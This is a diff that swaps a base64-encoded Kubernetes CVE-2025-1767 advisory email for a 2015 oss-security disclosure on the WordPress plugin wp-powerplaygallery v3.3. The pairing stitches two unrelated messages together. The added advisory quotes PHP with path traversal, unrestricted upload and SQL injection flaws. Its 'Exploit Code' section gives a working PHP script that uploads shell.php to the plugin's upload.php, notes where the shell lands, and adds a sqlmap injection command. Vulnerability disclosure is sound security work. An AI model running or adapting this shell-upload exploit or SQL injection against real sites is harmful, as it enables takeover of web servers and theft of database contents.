@@ -1,4 +1,9 @@
-Received: (qmail 11301 invoked by uid 550); 13 Mar 2025 18:48:18 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4506" "Sunday" "12" "July" "2015" "16:11:38" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4B83BB8E-8197-4530-816A-EF48BD586D89@me.com>" "112" "[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" nil nil nil "7" "2015071220:11:38" "[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" (number mark "        larry0@me.co Jul 12  112/4506  " thread-indent "\"[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 19863 invoked by uid 550); 12 Jul 2015 20:11:56 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,87 +11,134 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 19811 invoked from network); 12 Jul 2015 20:11:49 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure
+ engine=2.50.10432:5.14.151,1.0.33,0.0.0000
+ definitions=2015-07-12_12:2015-07-11,2015-07-12,1970-01-01 signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
+ reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507120349
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <4B83BB8E-8197-4530-816A-EF48BD586D89@me.com>
+MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
+X-Mailer: Apple Mail (2.2098)
+Date: Sun, 12 Jul 2015 16:11:38 -0400
+From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 30001 invoked from network); 13 Mar 2025 16:14:36 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-  d=amazon.com; i=@amazon.com; q=dns/txt; s=amazon201209;
-  t=1741882479; x=1773418479;
-  h=from:to:subject:date:message-id:mime-version;
-  bh=SeLTNQW21+JjaiofStbko6iGftYXy7enEotd7k+9sik=;
-  b=uTgVtfkXghs0zQ+EyBv3fD25zgX7i6wuxeJk4YSeCLzD2D0SQXh9qquc
-   rO4OJy1+6FI7Yfr/3pOgo7A/qPwIttPzm8GTB69zRvwRsdtZywdFuouE9
-   89qlXYwbrBG1ecYRaRuc2qwxcohaJn5f5CBXfPhHUuhUw4q1B0KbB39FI
-   A=;
-X-IronPort-AV: E=Sophos;i="6.14,245,1736812800"; 
-   d="scan'208,217";a="480163386"
-X-Farcaster-Flow-ID: 2bf687ca-c9e0-4ec6-a61a-d8497273f250
-From: "Vellore Rajakumar, Sri Saran Balaji" <srajakum@amazon.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: [kubernetes] CVE-2025-1767: GitRepo Volume Inadvertent Local
- Repository Access
-Thread-Index: AQHblDL8FM6uy0BONE+8o+I6OvMaJw==
-Date: Thu, 13 Mar 2025 16:14:24 +0000
-Message-ID: <3CF0EED5-09AE-4973-ACAA-CD19215780C3@amazon.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-user-agent: Microsoft-MacOutlook/16.94.25020927
-x-originating-ip: [10.13.138.67]
-Content-Type: multipart/alternative;
-	boundary="_000_3CF0EED509AE4973ACAACD19215780C3amazoncom_"
-MIME-Version: 1.0
-Subject: [oss-security] [kubernetes] CVE-2025-1767: GitRepo Volume Inadvertent Local
- Repository Access
-X-Spam: Yes
+Subject: [oss-security] Remote file upload vulnerability & SQLi in wordpress plugin
+ wp-powerplaygallery v3.3
+To: Open Source Security <oss-security@lists.openwall.com>
 
---_000_3CF0EED509AE4973ACAACD19215780C3amazoncom_
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Title: Remote file upload vulnerability & SQLi in wordpress plugin wp-power=
+playgallery v3.3
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-27
+Download Site: https://wordpress.org/plugins/wp-powerplaygallery
+Vendor: WP SlideShow
+Vendor Notified: 2015-06-29
+Advisory: http://www.vapid.dhs.org/advisory.php?v=3D132
+Vendor Contact: plugins@wordpress.org
+Description: This is the best gallery for touch screens. It is fully touch =
+enabled with great features. This gallery is compatible wiht iphone and ipa=
+ds. It is also allow us to use it as a widget.You can also enable this Powe=
+rplay Gallery on your wordpress site by placing code snippet in your templa=
+te (.php) files. It shows flash gallery for desktops and touch enabled vers=
+ion for ipad and iphones.
+Vulnerability:
+1. Ability to create directories out side of the upload path by using ../:
+Lines 56-59 of upload.php:
 
-SXNzdWUgRGV0YWlscw0KDQpBIHNlY3VyaXR5IHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQg
-aW4gS3ViZXJuZXRlcyB0aGF0IGNvdWxkIGFsbG93IGEgdXNlciB3aXRoIGNyZWF0ZSBwb2QgcGVy
-bWlzc2lvbiB0byBleHBsb2l0IGdpdFJlcG8gdm9sdW1lcyB0byBhY2Nlc3MgbG9jYWwgZ2l0IHJl
-cG9zaXRvcmllcyBiZWxvbmdpbmcgdG8gb3RoZXIgcG9kcyBvbiB0aGUgc2FtZSBub2RlLg0KDQpU
-aGlzIGlzc3VlIGhhcyBiZWVuIHJhdGVkIE1lZGl1bSAoQ1ZTUzozLjEvQVY6Ti9BQzpML1BSOkgv
-VUk6Ti9TOlUvQzpIL0k6SC9BOk48aHR0cHM6Ly93d3cuZmlyc3Qub3JnL2N2c3MvY2FsY3VsYXRv
-ci8zLjEjQ1ZTUzozLjEvQVY6Ti9BQzpML1BSOkgvVUk6Ti9TOlUvQzpIL0k6SC9BOk4+KSAoc2Nv
-cmU6IDYuNSksIGFuZCBhc3NpZ25lZCBDVkUtMjAyNS0xNzY3Lg0KDQpBbSBJIHZ1bG5lcmFibGU/
-DQoNClRoaXMgQ1ZFIG9ubHkgYWZmZWN0cyBLdWJlcm5ldGVzIGNsdXN0ZXJzIHRoYXQgdXRpbGl6
-ZSB0aGUgaW4tdHJlZSBnaXRSZXBvIHZvbHVtZSB0byBjbG9uZSBnaXQgcmVwb3NpdG9yaWVzIGZy
-b20gb3RoZXIgcG9kcyB3aXRoaW4gdGhlIHNhbWUgbm9kZS4gU2luY2UgdGhlIGluLXRyZWUgZ2l0
-UmVwbyB2b2x1bWUgZmVhdHVyZSBoYXMgYmVlbiBkZXByZWNhdGVkIGFuZCB3aWxsIG5vdCByZWNl
-aXZlIHNlY3VyaXR5IHVwZGF0ZXMgdXBzdHJlYW0sIGFueSBjbHVzdGVyIHN0aWxsIHVzaW5nIHRo
-aXMgZmVhdHVyZSByZW1haW5zIHZ1bG5lcmFibGUuDQoNCkFmZmVjdGVkIENvbXBvbmVudHMNCg0K
-ICAqICAga3ViZWxldA0KDQoNCkFmZmVjdGVkIFZlcnNpb25zDQoNCiAgKiAgIEFsbCB2ZXJzaW9u
-cyBvZiBLdWJlcm5ldGVzDQoNCkhvdyBkbyBJIG1pdGlnYXRlIHRoaXMgdnVsbmVyYWJpbGl0eT8N
-Cg0KVG8gbWl0aWdhdGUgdGhpcyB2dWxuZXJhYmlsaXR5LCB5b3UgbXVzdCB1c2UgYW4gaW5pdCBj
-b250YWluZXIgdG8gcGVyZm9ybSBnaXQgY2xvbmUgb3BlcmF0aW9uIGFuZCB0aGVuIG1vdW50IHRo
-ZSBkaXJlY3RvcnkgaW50byB0aGUgUG9kJ3MgY29udGFpbmVyLiBBbiBleGFtcGxlIG9mIHRoaXMg
-YXBwcm9hY2ggaXMgcHJvdmlkZWQgaGVyZTxodHRwczovL2dpc3QuZ2l0aHViLmNvbS90YWxsY2xh
-aXIvODQ5NjAxYTE2Y2ViZWVlNTgxZWYyYmU1MGMzNTE4NDE+Lg0KDQpOb3RlOiBZb3UgY2FuIGFs
-c28gcmVzdHJpY3QgdGhlIHVzZSBvZiBnaXRSZXBvIHZvbHVtZXMgaW4geW91ciBjbHVzdGVyIHVz
-aW5nIHBvbGljaWVzIHN1Y2ggYXMgVmFsaWRhdGluZ0FkbWlzc2lvblBvbGljeSBvciB0aHJvdWdo
-IFJlc3RyaWN0ZWQgcG9kIHNlY3VyaXR5IHN0YW5kYXJkIHBvbGljeS4gWW91IGNhbiB1c2UgdGhl
-IGZvbGxvd2luZyBDb21tb24gRXhwcmVzc2lvbiBMYW5ndWFnZSAoQ0VMKSBleHByZXNzaW9uIGFz
-IHBhcnQgb2YgYSBwb2xpY3kgdG8gcmVqZWN0IHVzZSBvZiBnaXRSZXBvIHZvbHVtZXM6IGBoYXMo
-b2JqZWN0LnNwZWMudm9sdW1lcykgfHwgIW9iamVjdC5zcGVjLnZvbHVtZXMuZXhpc3RzKHYsIGhh
-cyh2LmdpdFJlcG8pKWANCg0KRGV0ZWN0aW9uDQpUbyBkZXRlY3Qgd2hldGhlciB0aGlzIHZ1bG5l
-cmFiaWxpdHkgaGFzIGJlZW4gZXhwbG9pdGVkLCB5b3UgY2FuIHVzZSB0aGUgZm9sbG93aW5nIGNv
-bW1hbmQgdG8gbGlzdCBhbGwgcG9kcyB0aGF0IHVzZSB0aGUgaW4tdHJlZSBnaXRSZXBvIHZvbHVt
-ZSBhbmQgY2xvbmVzIHRvIGEgLmdpdCBzdWJkaXJlY3RvcnkuDQoNCmBrdWJlY3RsIGdldCBwb2Rz
-IC0tYWxsLW5hbWVzcGFjZXMgLW8ganNvbiB8IGpxICcuaXRlbXNbXSB8IHNlbGVjdCguc3BlYy52
-b2x1bWVzW10uZ2l0UmVwby5yZXBvc2l0b3J5IHwgdGVzdCgiXi8iKSkgfCB7bmFtZTogLm1ldGFk
-YXRhLm5hbWUsIG5hbWVzcGFjZTogLm1ldGFkYXRhLm5hbWVzcGFjZSwgcmVwb3NpdG9yeTogKC5z
-cGVjLnZvbHVtZXNbXSB8IHNlbGVjdCguZ2l0UmVwbykgfCAuZ2l0UmVwby5yZXBvc2l0b3J5KX0n
-YA0KDQpJZiB5b3UgZmluZCBldmlkZW5jZSB0aGF0IHRoaXMgdnVsbmVyYWJpbGl0eSBoYXMgYmVl
-biBleHBsb2l0ZWQsIHBsZWFzZSBjb250YWN0IHNlY3VyaXR5QGt1YmVybmV0ZXMuaW88bWFpbHRv
-OnNlY3VyaXR5QGt1YmVybmV0ZXMuaW8+DQoNCkFkZGl0aW9uYWwgRGV0YWlscw0KU2VlIEt1YmVy
-bmV0ZXMgSXNzdWUgIzEzMDc4NjxodHRwczovL2dpdGh1Yi5jb20va3ViZXJuZXRlcy9rdWJlcm5l
-dGVzL3B1bGwvMTMwNzg2PiBmb3IgbW9yZSBkZXRhaWxzLg0KDQpBY2tub3dsZWRnZW1lbnRzDQpU
-aGlzIHZ1bG5lcmFiaWxpdHkgd2FzIHJlcG9ydGVkIGJ5IENocmlzdG9waGUgSGF1cXVpZXJ0Lg0K
-DQpUaGFuayBZb3UsDQoNCkJhbGFqaSBvbiBiZWhhbGYgb2YgdGhlIEt1YmVybmV0ZXMgU2VjdXJp
-dHkgUmVzcG9uc2UgQ29tbWl0dGVlDQoNCg==
+56 // Create target dir
+57 if (!file_exists($targetDir)) {
+58         @mkdir($targetDir);
+59 }=20=20=20=20=20=20
 
---_000_3CF0EED509AE4973ACAACD19215780C3amazoncom_--
+2. Arbitrary file uploads to a path in the web root directory:
+Lines 138-160 of uploads.php don=E2=80=99t verify what types of files are a=
+llowed or where they should be placed:
+
+138 // Open temp file
+139 if (!$out =3D @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
+140         die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Fa=
+iled to open output stream."}, "id" :     "id"}');
+141 }
+142=20
+143 if (!empty($_FILES)) {
+144         if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file=
+"]["tmp_name"])) {
+145                 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "messa=
+ge": "Failed to move uploaded file."}    , "id" : "id"}');
+146         }
+147=20
+148         // Read binary input stream and append it to temp file
+149         if (!$in =3D @fopen($_FILES["file"]["tmp_name"], "rb")) {
+150                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "messa=
+ge": "Failed to open input stream."},     "id" : "id"}');
+151         }
+152 } else {
+153         if (!$in =3D @fopen("php://input", "rb")) {
+154                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "messa=
+ge": "Failed to open input stream."},     "id" : "id"}');
+155         }
+156 }
+157=20
+158 while ($buff =3D fread($in, 4096)) {
+159         fwrite($out, $buff);
+160 }
+
+3. Sql injection=20
+Lines 131-135 of upload.php fail to handle user input appropriately either =
+by sanitizing or paramaterizing it. Injection points are
+any GET/POST to albumid or name.
+
+131 $query =3D "INSERT INTO ".$wpdb->prefix."pp_images (`category_id`, `tit=
+le`, `description`, `price`, `thumb`, `    image`, `status`, `order`, `crea=
+tion_date` )
+132           VALUES (".$_REQUEST['albumid'].",'".$imgname[0]."','".$imgnam=
+e[0]."','','".$resize."','".$_REQUEST    ['name']."',1,'','NULL')";
+133=20
+134           $wpdb->query($query);
+135=20
+
+CVEID:
+OSVDB:
+Exploit Code:
+	=E2=80=A2 <?php
+	=E2=80=A2 /*Remote shell upload exploit for wp-powerplaygallery v3.3 */
+	=E2=80=A2 /*Larry W. Cashdollar @_larry0
+	=E2=80=A2 6/27/2015
+	=E2=80=A2 albumid needs to be a numeric value matching an existing album n=
+umber, 1 is probably a good start
+	=E2=80=A2 but you can enumerate these by using curl, and looking for redir=
+ect 301 responses:
+	=E2=80=A2 e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_pl=
+ay/4_uploadfolder/big
+	=E2=80=A2 ->301 exists else 404 doesn't.
+	=E2=80=A2 shell is http://www.vapidlabs.com/wp-content/uploads/power_play/=
+4_uploadfolder/big/shell.php
+	=E2=80=A2 */
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 	$target_url =3D 'http://www.vapidlabs.com/wp-content/plugins/wp=
+-powerplaygallery/upload.php';
+	=E2=80=A2 	$file_name_with_full_path =3D '/var/www/shell.php';
+	=E2=80=A2=20=20
+	=E2=80=A2         echo "POST to $target_url $file_name_with_full_path";
+	=E2=80=A2 	$post =3D array('albumid'=3D>'foo' , 'name' =3D> 'shell.php','f=
+ile'=3D>'@'.$file_name_with_full_path);
+	=E2=80=A2=20=20
+	=E2=80=A2         $ch =3D curl_init();
+	=E2=80=A2 	curl_setopt($ch, CURLOPT_URL,$target_url);
+	=E2=80=A2 	curl_setopt($ch, CURLOPT_POST,1);
+	=E2=80=A2 	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	=E2=80=A2         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+	=E2=80=A2 	$result=3Dcurl_exec ($ch);
+	=E2=80=A2 	curl_close ($ch);
+	=E2=80=A2         echo "<hr>";
+	=E2=80=A2 	echo $result;
+	=E2=80=A2         echo "<hr>";
+	=E2=80=A2 ?>
+SQLi PoC:
+$ sqlmap -u http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery=
+/upload.php --data "albumid=3D1=E2=80=9D  =E2=80=94dbms mysql=
